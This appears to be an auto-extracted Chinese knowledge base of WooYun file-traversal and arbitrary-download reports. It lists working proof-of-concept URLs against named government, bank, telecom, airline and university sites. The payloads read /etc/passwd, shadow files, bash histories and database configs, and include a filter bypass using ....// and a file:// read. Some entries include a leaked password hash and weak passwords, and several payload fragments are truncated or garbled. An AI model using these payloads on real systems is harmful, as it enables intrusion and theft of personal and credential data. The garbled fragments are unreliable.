# FILE-TRAVERSAL 漏洞分析

> 自动提取于 2026-01-23 18:57
> 样本数量: 5

## 高频参数
```
  urlParam: 1次
  url: 1次
  dd: 1次
  RelatedPath: 1次
```

## 元思考模式

### 攻击模式分布
```
  遍历: 2次
  泄露: 1次
```

## 典型案例

### 案例 1: wooyun-2015-0116637
**标题**: 淘客帝国CMS 任意文件读取
**原始类型**: 漏洞类型：任意文件遍历/下载
**参数**: `url`
**URL示例**: 
  - `http://wooyun.org/bugs/wooyun-2015-0116550/trace/4ca5456cb29a089f537c7e6f2743d40b`
  - `http://localhost/taodiv6free_installhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/pic.php?ur...`
**洞察提取**:
**Payload片段**:
  ```
  org/bugs/wooyun-2015-0116550/trace/4ca5456cb29a089f5
  ```
  ```
  ORIG_PATH_INFO"])){ $nav = $_SERVER["ORIG_PATH_INFO"
  ```
  ```
  ; $code=str_replace("!",'+',$co
  ```

### 案例 2: wooyun-2013-033587
**标题**: 某政府网站任意文件下载漏洞
**原始类型**: 漏洞类型：任意文件遍历/下载
**参数**: `dd`
**URL示例**: 
  - `http://www.jdxf.gov.cn/download.php下载请求http://www.jdxf.gov.cn/down.php?dd=文件名以下载down.php为例http://www...`
**洞察提取**:
  - 中共旌德县委组织部下载地址的列表：http://www.jdxf.gov.cn/download.php下载请求http://www.jdxf.gov.cn/down.php?dd=文件名以下载down.php为例http://www.jdxf.gov.cn/down.php?dd=../down.php

### 案例 3: wooyun-2015-0143202
**标题**: 全峰快递任意文件遍历（大量订单/公司内部资料泄露）
**原始类型**: 漏洞类型：任意文件遍历/下载
**洞察提取**:

### 案例 4: wooyun-2015-0124527
**标题**: 华云数据某站存在任意文件读取漏洞
**原始类型**: 漏洞类型：任意文件遍历/下载
**参数**: `urlParam`
**URL示例**: 
  - `http://isv.chinac.com/index_toParam.action?urlParam=../../../WEB-INF/web.xml%3f`
**洞察提取**:
  - http://isv.chinac.com/index_toParam.action?urlParam=../../../WEB-INF/web.xml%3f

### 案例 5: wooyun-2014-085648
**标题**: siteserver某子站存在目录遍历漏洞
**原始类型**: 漏洞类型：任意文件遍历/下载
**参数**: `RelatedPath`
**URL示例**: 
  - `http://2011.moban.siteserver.cn/UserCenter/platform/filemanagement.aspx?RelatedPath=/d:/wwwroot/`
**Payload片段**:
  ```
  orm/filemanagement.aspx?RelatedPath=/d:/wwwroot/  路径
  ```


---

## 批次 2 (索引 200-399)
> 样本数量: 6

### 高频参数
```
  filePath: 2次
  memberID: 1次
  FileID: 1次
  RequestType: 1次
  FileName: 1次
```

### 典型案例

#### wooyun-2016-0169434
**翰碩科技任意文件下載（臺灣地區）**
- 参数: `hDFile`
- Payload: `ort/down.php?hDFile=../index.php配置文件http://**.**.**.`

#### wooyun-2016-0175625
**海康威视某视频接入网关系统通用型任意文件遍历下载(大量设备受影响无需登录)**
- Payload: `ory.back(-1);</script>';exit();}else{$file = fopen($`

#### wooyun-2015-0103425
**云南省防震网任意文件读取**
- 参数: `filePath`
- Payload: `ort sysimport pycurlfrom StringIO import StringIOurl`

#### wooyun-2014-059385
**某事业单位用人才系统存在任意文件下载漏洞和越权查看简历**
- 参数: `memberID, FileID, RequestType, FileName, FilePath`
- Payload: `and或者直接找一些下载页面（可能不全）inurl:sydwzk/download/Down.jsp---`

#### wooyun-2014-056784
**中钢集团某公司全服务器任意文件遍历**
- 参数: `Vis3, Vis2, Vis1, filePath, method`
- 洞察:
  - 中钢集团衡阳重机有限公司http://www.hymaco.com:8080/hyoa2/file/fileList.do?method=FileList&Vis1=1&Vis2=1&Vis3=0&Vis4=0&filePath=D://HYOA//hyoa2//WebRoot//WEB-INF

#### wooyun-2014-074462
**岳阳市政府js文件导致泄库事件**

---

## 批次 3 (索引 400-599)
> 样本: 7

### 高频参数
```
  filename: 2
  opt: 1
  userid: 1
  courseId: 1
  filetype: 1
```

### 典型案例

#### wooyun-2016-0189746
**Winmail Server 6.0邮件系统存在任意文件下载漏洞（无需登录）**
- 参数: `opt, filename, userid`
- Payload: `selected_theme.'/netdisk-viewshare.htm');exit;}getlangua`

#### wooyun-2015-0105480
**悟空CRM任意文件下载漏洞(需登录)**
- 参数: `path, a, m, name`
- Payload: `;$name = substr(trim(urldecode(`

#### wooyun-2015-0126332
**某教室精品系统任意文件下载#1**
- 参数: `courseId, filetype, filepath`

#### wooyun-2014-068791
**某教育类通用cms任意文件下载漏洞**
- 参数: `Accessory`

#### wooyun-2012-08729
**中国联通某站点任意文件下载**
- 参数: `filename`
- 洞察:
  - 原始链接：http://www.i-pass.com.cn/jsp/download.jsp?filename=iPASS%CA%B9%D3%C3%CA%D6%B2%E1.doc其中文件下载路径参数filename没有对路径进行必要的限制！

#### wooyun-2015-0132609
**某市中级人民法院执行案件互动平台（多个法院）**

---

## 批次 4 (索引 600-799)
> 样本: 4

### 高频参数
```
  n: 1
  image: 1
```

### 典型案例

#### wooyun-2014-058736
**中央国家机关干部职工心里健康任意文件读取**
- 参数: `image`

#### wooyun-2015-0144317
**用友软件企业门户xxe漏洞[测试前用友官域]**

#### wooyun-2014-086524
**某市公共行政服务中心任意文件下载**
- 参数: `n`

#### wooyun-2014-076734
**一个关键词秒杀所有桃源网盘（全是学校和教育网的）**
---
### [wooyun-2016-0195645] 58运维管理平台配置不当大量敏感信息泄露/备份文件泄露

**漏洞类型**: 应用配置错误

**元思考**: 
- 触发点：http://211.151.3.118/ksweb/login/go没想到有目录遍历这个估计是ssh密码...
- 攻击者视角：寻找应用配置错误相关的入口点

**洞察**: 
- 漏洞本质：开发者在应用配置错误方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：http://211.151.3.118/ksweb/login/go没想到有目录遍历这个估计是ssh密码

**POC**: 
敏感的文件很多。。列举mask 区域*****ame=s**********4an_Gl7**********usp.58corp.c**********t/usp/age**********t/usp/agent**********t/usp/agent**********pt/usp/agen**********usp.58corp.c**********0,10.5.11.61:210**********60:5181,10.5.11.61**********nv.t********************rnam**********usp@58.**********rvice.58**

**修复建议**: 禁止。。


---
### [wooyun-2015-0145159] 深度上网行为管理设备敏感文件下载（可成功控制设备）

**漏洞类型**: 非授权访问

**元思考**: 
- 触发点：深度上网行为管理系统备份配置文件下载功能权限控制不当，可直接下载，进一步读取登录凭据，成功控制设备。打包的备份配置文件密码虽然未公开，但是很容易猜出，且所有设备统一，具体见测试代码部分。...
- 攻击者视角：寻找非授权访问相关的入口点

**洞察**: 
- 漏洞本质：开发者在非授权访问方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：深度上网行为管理系统备份配置文件下载功能权限控制不当，可直接下载，进一步读取登录凭据，成功控制设备。打包的备份配置文件密码虽然未公开，但是很容易猜出，且所有设备统一，具体见测试代码部分。

**POC**: 
直接访问以下接口可下载打包的备份配置文件：https://*.*.*.*/getcfgfile解压后，可查看管理员用户名、口令（sha512加密）C7AD44CBAD762A5DA0A452F9E854FDC1E0E7A52A38015F23F3EAB1D80B931DD472634DFAC71CD34EBC35D16AB7FB8A90C81F975113D6C7538DC69DD8DE9077ECadmin该设备不但可以查看相关的上网行为记录，还有个有趣的营销推送功能，可向目标推送定制的页面...!!! ^_^受影响的部分用户：**.**.**.**/getcfgfile**.**.**.*

**修复建议**: 必要的身份认证！


---
### [wooyun-2014-067862] Yxcms后台文件遍历任意删除文件漏洞(攻击中适用于旁站的时候)

**漏洞类型**: 任意文件遍历/下载

**元思考**: 
- 触发点：首先，说下漏洞的危害，例如我要入侵一个站点，但是无法从主站入侵，那么就从旁站，刚好有一个yxcms的站点，好啦，这时候这个漏洞就有用了进入后台之后，点击进入上传文件管理，之后我们随便点击进入一个目录，...
- 攻击者视角：寻找任意文件遍历/下载相关的入口点

**洞察**: 
- 漏洞本质：开发者在任意文件遍历/下载方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：首先，说下漏洞的危害，例如我要入侵一个站点，但是无法从主站入侵，那么就从旁站，刚好有一个yxcms的站点，好啦，这时候这个漏洞就有用了进入后台之后，点击进入上传文件管理，之后我们随便点击进入一个目录，这个时候记得抓包哦看到dirget=%2C%2Cphotos，那么我们如果将dirget后面的改为../会怎么样呢，试试看看看结果哈哈，目录变了，看看是不是到了上一级的目录是吧，我们再试试回到更前面的

**POC**: 
(无详细POC)

**修复建议**: 懂得。


---
### [wooyun-2014-027184] 一览机电英才网存在任意文件下载漏洞

**漏洞类型**: 任意文件遍历/下载

**元思考**: 
- 触发点：http://www.jdjob88.com/myNew/down.php?filename=../index.php下载代码，可以下载任意的。...
- 攻击者视角：寻找任意文件遍历/下载相关的入口点

**洞察**: 
- 漏洞本质：开发者在任意文件遍历/下载方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：http://www.jdjob88.com/myNew/down.php?filename=../index.php下载代码，可以下载任意的。

**POC**: 
(无详细POC)

**修复建议**: 加一下过滤吧


---
### [wooyun-2014-070455] 通卡运维不当可导致海量个人信息泄露（姓名，电话，身份证，地址，生日等）

**漏洞类型**: 敏感信息泄露

**元思考**: 
- 触发点：看到有人提了个通卡的 数据库oracle链接信息泄露就看了下发现个目录遍历漏洞   4000多个压缩包所以我想 应该不重复吧。 如果重复的话 请忽略吧地址是http://pic.tongcard.ne...
- 攻击者视角：寻找敏感信息泄露相关的入口点

**洞察**: 
- 漏洞本质：开发者在敏感信息泄露方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：看到有人提了个通卡的 数据库oracle链接信息泄露就看了下发现个目录遍历漏洞   4000多个压缩包所以我想 应该不重复吧。 如果重复的话 请忽略吧地址是http://pic.tongcard.net/MemberInfo/4000多个压缩包里面全是用户信息可以随便下载真实姓名  电话  身份证号  地址 消费  生日 等等都有的

**POC**: 
同上

**修复建议**: 目录遍历  应你们该知道怎么弄


---
### [wooyun-2012-016718] 易观网主站任意文件读取，导致大量敏感信息泄露

**漏洞类型**: 敏感信息泄露

**元思考**: 
- 触发点：易观网主站存在任意文件下载漏洞，从而可以读取服务器上的任意文件（权限允许的情况下），然后服务器上的用户信息、Apache配置文件、虚拟主机配置文件、MySQL配置文件等等大量敏感信息都可以读取了。还可...
- 攻击者视角：寻找敏感信息泄露相关的入口点

**洞察**: 
- 漏洞本质：开发者在敏感信息泄露方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：易观网主站存在任意文件下载漏洞，从而可以读取服务器上的任意文件（权限允许的情况下），然后服务器上的用户信息、Apache配置文件、虚拟主机配置文件、MySQL配置文件等等大量敏感信息都可以读取了。还可以读取网站目录下的任意文件。幸亏你们的数据库连接配置文件config.inc.php藏得深，一时没找到，不然也可以读取。一旦读取到，服务器上的所有数据库面临泄露的风险。

**POC**: 
访问http://www.eguan.cn/download/download.php?aid=151208&path=/../../../../../etc/passwd，就可以下载passwd文件了，如图1，然后看到了服务器上的所有用户信息，如图2。http://www.eguan.cn/download/download.php?aid=151208&path=/../../../../../etc/httpd/conf/httpd.conf，下载了Apache的配置文件httpd.conf。http://www.eguan.cn/download/download.php?aid=15

**修复建议**: 管理员懂的。


---
### [wooyun-2014-087735] Data地方门户系统 任意文件读取

**漏洞类型**: 设计缺陷/逻辑错误

**元思考**: 
- 触发点：地址http://demo.htmdata.com/ashx/GetPage.ashx主要源码如下public void ProcessRequest(HttpContext context){con...
- 攻击者视角：寻找设计缺陷/逻辑错误相关的入口点

**洞察**: 
- 漏洞本质：开发者在设计缺陷/逻辑错误方面的安全意识不足
- 常见误区：信任用户输入，缺乏过滤/验证

**测试流程**:
1. 识别目标功能点
2. 构造测试 payload
3. 观察响应差异

**利用方法**: 
- 详情：地址http://demo.htmdata.com/ashx/GetPage.ashx主要源码如下public void ProcessRequest(HttpContext context){context.Response.ContentType = "text/plain";string s = "";string requestUriString = Tool.CStr(context.R

**POC**: 
漏洞证明官网访问http://demo.htmdata.com/ashx/GetPage.ashxpost提交url=file://c:/windows/win.ini案例二http://www.qidongr.com/ashx/GetPage.ashxpost提交url=file://c:/windows/win.ini案例三http://www.akshw.net/ashx/GetPage.ashxpost提交url=file://c:/windows/win.ini案例四http://www.anhua0737.com/ashx/GetPage.ashxpost提交url=file://

**修复建议**: 对file://进行判断处理


---
### [wooyun-2015-0159075] 中国移动某系统绕过过滤防护继续任意文件读取可实现全站下载
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无聊时，看大牛的漏洞，http://**.**.**.**/bugs/wooyun-2010-0149415然后试了一下，发现修复了。but……发现会把 ../ 置空利用....// 代替 ../利用..// 代替 /任意文件下载

**POC**: **.**.**.**/beapp/zh/index/login.jsp山东移动外勤通系统**.**.**.**/beapp/dow.download?filename=....//....//....//....//....//etc..//passwd读取配置文件web.xml读取/WEB-INF/faces-config.xml下载class文件反编译

**绕过**: 直接利用

**修复**: 严格过滤
---

---
### [wooyun-2015-095072] 疑似春秋航空某后台系统存在目录遍历（泄漏部分用户信息）
**厂商**: 春秋航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://180.153.27.10:8080/content/CSV/

**POC**: 证明是春秋的：1.csv 跟10.csv里面

**绕过**: 直接利用

**修复**: 目录权限问题
---

---
### [wooyun-2015-0142270] 湖南某银行主站存在任意文件读取漏洞导致敏感信息泄露
**厂商**: 湖南某银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 湖南宜章农商银行系统主站phpcms未升级，存在任意文件读取漏洞，导致敏感信息泄露。

**POC**: 银行主站地址：http://**.**.**.**/phpcms/看到银行的URL中包含phpcms，经过一番寻找发现该银行系统使用的是phpcmsV9版本，这个版本存在任意文件读取漏洞。读取数据库文件database.php：http://**.**.**.**/phpcms/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php主机名、数据库、用户名、密码都在这了。查看一些版本phpcms版本：http://**.**

**绕过**: 直接利用

**修复**: 升级！
---

---
### [wooyun-2015-0157874] 江西公共资源交易网存在目录遍历漏洞
**厂商**: 江西公共资源交易网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/FileUpload/FCKFile/file/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 屏蔽目录显示。
---

---
### [wooyun-2016-0168270] 创维某系统漏洞打包（文件读取&弱口令）
**厂商**: 深圳市酷开网络科技有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://14.17.69.188/admin1#文件包含http://14.17.69.188/skyservice/pic?/etc/hostshttp://14.17.69.188/skyservice/pic?/etc/shadowhttp://14.17.69.188/skyservice/pic?/root/.bash_history你懂的http://14.17.69.188/skyservice/pic?/usr/local/jboss/server/default/deploy/mysql-ds.xml

**POC**: 2#弱口令http://14.17.69.188/adminadmin/admin

**绕过**: 直接利用

**修复**: 过滤&强口令
---

---
### [wooyun-2015-0123528] 易龙天网旗下CMS任意文件读取漏洞
**厂商**: 北京易龙天网科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以看到，程序读取任意文件，然后输出了，if(is_array($areablockVars))$tmp=htmlspecialchars_decode($areablockVars['content_html']);else$tmp=(file_get_contents($_GET['tpl']));

**POC**: 来几个案例吧中化石油：http://www.sinochemoil.com/esbclient/loadarea.php?tpl=c:\windows\system32\drivers\etc\hosts鹏龙股份：http://www.bjrocar.com/esbclient/loadarea.php?tpl=/etc/passwd必可测科技：http://www.bicotest.com.cn/esbclient/loadarea.php?tpl=/etc/passwd云泽山庄：http://www.bjyunze.com/esbclient/loadarea.php?tpl=c:\win

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-059153] 某政府网站任意文件下载遍历（敏感信息泄漏）
**厂商**: 中国动物疫病预防控制中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.cadc.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Files/GreenMail/2021/

**POC**: 还有一些就不截图了.没有下载这些无聊的东西.

**绕过**: 直接利用

**修复**: 分配用户权限.
---

---
### [wooyun-2015-0115956] 中国铁建某系统任意文件读取漏洞
**厂商**: crcc.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /eassso//../../../../../../../../etc/passwd HTTP/1.1Host: hr.crcc.cnUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=wKhkZBrqVWHYFWhJh_DG10GAkfEIV44WcGwA; user_ticket=NONE; eac_ticket=NONE;

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 身份鉴别做好文件过滤
---

---
### [wooyun-2013-026077] 澳门身份证明局 任意文件下载 造成敏感信息泄露
**厂商**: 澳门身份证明局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 澳门身份证明局 任意文件下载 造成敏感信息泄露

**POC**: 漏洞地址:http://www.dsi.gov.mo/srvDownloadFile.do?file_name=../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 你懂得.
---

---
### [wooyun-2015-095257] 某省安全生产信息网内容信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hlsafety.gov.cn/黑龙江省安全生产信息网存在目录遍历、物理路径泄漏等漏洞

**POC**: http://www.hlsafety.gov.cn/apphttp://www.hlsafety.gov.cn/app/zcswz/123.jsphttp://www.hlsafety.gov.cn/app/zcswz/FCKeditor/editor/filemanager/connectors/test.html

**绕过**: 直接利用

**修复**: 运维都懂
---

---
### [wooyun-2014-061225] TRS系统任意文件下载漏洞
**厂商**: 北京拓尔思信息技术股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此系统多为大型政府新闻发布站点（新闻源），如一旦被某些（博彩集团）控制，估计后果危害不是一般大。。。http://123.131.133.150:8080/wcm/ 临沂日报报业集团http://61.153.63.94/wcm 云和县政府所有发布站点http://www.cflac.org.cn/wcm 中国文联http://wcm.xxz.gov.cn:8080/wcm/ 湘西州政府站群http://www.jscnt.gov.cn/wcm/ 江苏省文化厅http://www.sccnt.gov.cn 四川省文化厅http://218.94.123.203/wcm 江苏长安网http://203.86.89.25/wcm/ 中国书籍出版社http://www.lfcgs.gov.cn:8080/wcm/ 廊坊车管所http://iwr.cass.cn/wcm/ 中国社会科学院http:

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-077210] 某用户量特别大的教育类CMS存在任意文件下载
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面：http://www.hbycscjzx.com//OperationManage/DownFile.aspx首先注册一个普通账户在个人中心写站内消息的时候插入附件抓包。可以看到以下内容POST /OperationManage/DownFile.aspx HTTP/1.1Host: www.hbycscjzx.comProxy-Connection: Keep-AliveContent-Length: 114Pragma: no-cacheCache-Control: no-cacheAccept: */*Accept-Language: zh-CNContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-053908] 某杂志系统任意文件下载漏洞
**厂商**: 北京玛格泰克科技发展有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京玛格泰克科技发展有限公司 公司开发的Journal 系统存在任意文件下载漏洞，可下载系统重要信息系统介绍http://www.magtech.com.cn/CN/column/column33.shtml官方测试成功http://www.magtech.com.cn/CN/item/downloadFile.jsp?filedisplay=../../CN/item/downloadFile.jsp对传入的filedisplay 变量未过滤导致，任意文件读取 代码如下:<%@page language="java" contentType="application/x-msdownload"import="java.io.*,java.net.*,com.wkxt.article.*,com.wkxt.article.web.*,com.lyt.*,com.lyt.web.*,java

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对参数进行过滤
---

---
### [wooyun-2015-0150538] 航空安全之春秋航空任意文件下载/爆破(导致泄露内部资料)
**厂商**: 春秋航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞点：http://fcs.9cair.comhttp://fcs.9cair.com/ImageShowServlet?para=fcs123&filetype=1&filePath=../../../../../../../../../etc/passwd%00爆破，虽然让人提过,修复了OA的爆破漏洞；但是mail的没修复,有些账号密码还是未修改建议强制修改吧!漏洞点：mail.ch.cn 弱密码:123456xupingxuyizhaotiewuhaojiangkua

**POC**: 已证明

**绕过**: 直接利用

**修复**: 过滤..；强制修改密码，QQ的mail邮箱好像可以设置登陆微信提醒！
---

---
### [wooyun-2015-0164818] 山东大学某分站任意文件下载导致敏感信息泄漏
**厂商**: 山东大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL:http://www.medgrade.sdu.edu.cn/downloadfile.php?path=下载index.php发现文件不存在，于是猜了一下config.php结果真的存在：下载config.php:URL:http://www.medgrade.sdu.edu.cn/downloadfile.php?path=config.php里面直接包含数据库的帐号密码：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: YOU KNOW
---

---
### [wooyun-2016-0190361] 中赢金融任意文件下载漏洞
**厂商**: 中赢金融 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.chinazyjr.com/index.php?m=index&c=contactus&a=fileDown&pdfname=../../../etc/passwdhttp://www.chinazyjr.com/index.php?m=index&c=contactus&a=fileDown&pdfname=/application/config/database.php

**POC**: javascript:void(0)>

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120541] 渗透测试阿姨帮(大量雇主阿姨数据泄漏)
**厂商**: ayibang.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取：http://ayibang.com/appointment/detail?city=%E5%8C%97%E4%BA%AC&keyword=../../../../../../../../../../etc/passwd%00.jpg

**POC**: 当前用户www，可读取.bash_history/appointment/detail?city=%E5%8C%97%E4%BA%AC&keyword=../../../../../../../../../../home/www/.bash_history%00.jpg/data/webserver/nginx/conf/vhost/admin.ay.com.confroot  /data/htdocs/admin.ay.com/publiclisten	 8306;server_name  admin.ay.com admin0803.ayibang.com;修改hosts，访问后台，这后台

**绕过**: 直接利用

**修复**: 过滤，限定不可跨父目录增强安全
---

---
### [wooyun-2015-0132070] 乐知行教学系统高危任意文件包含
**厂商**: 乐知行 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：北京乐知行软件有限公司是一家教育信息化软件公司，业务涉及教育信息化整体解决方案、互联网教育、教育公有云，是北京市及国家高新技术企业，公司致力于全新的应用技术与用户体验，运用云计算、大数据、移动联网技术，为中国教育信息化的推进与优化搭建全新的操作与创新平台。这个漏洞用浏览器还真得不到结果的。任意文件读取：/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00Case:**.**.**.**/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00http://**.**.**.**/datacenter/global/login.do?bg=../../../../../../../etc/passwd%00http://**.**.**.

**POC**: Security Testing:1、我们看浏览器测试的结果；没有返回结果啊~难道浏览器问题，换个google抓包看一下。还是没有，这时候我就突然想到了可以使用curl来试试对吧。结果！哈哈！果然成功了！2、试试读取shadow看看，居然读出来了，危害度过高啊！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-084756] 湖南省政府子站点任意文件下载
**厂商**: 湖南省政府 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点地址：http://smb.hunan.gov.cn/网站下载功能处对输入的参数未能进行完整的过滤，导致可以下载任意文件。如下图，下载网站的web.config，来获取数据库帐号密码

**POC**: 不做过多举例

**绕过**: 直接利用

**修复**: 过滤参数。加强运营运维管理，小漏洞也能攻破防线，act.hunan.gov.cn 这台服务器已经被有webshell存在。
---

---
### [wooyun-2012-016569] 上海电信网上营业厅任意文件下载漏洞
**厂商**: 中国电信 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参数没限制，可以下载任意文件。参数直接用绝对路径，也是有问题的。1、查看自己家里帐单的时候，右键图片URL地址不小心发现的。。2、下载配置文件web.xml3、找到个数据库配置文件4、下载其他jsp源文件仅做以上安全检测。

**POC**: 1、查看自己家里帐单的时候，右键图片URL地址不小心发现的。。2、下载配置文件web.xmlhttp://sh.189.cn/service/showImage?file=/usr/IBM/WebSphere/AppServer/profiles/AppSrv01/installedApps/SHWT_APPCell01/service_02.ear/service.war/WEB-INF/web.xml3、找到个数据库配置文件4、下载其他jsp源文件http://sh.189.cn/service/showImage?file=/usr/IBM/WebSphere/AppServer/pro

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2013-034251] 东风目录遍历及未授权访问造成帐单等敏感信息泄露
**厂商**: dfyb.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

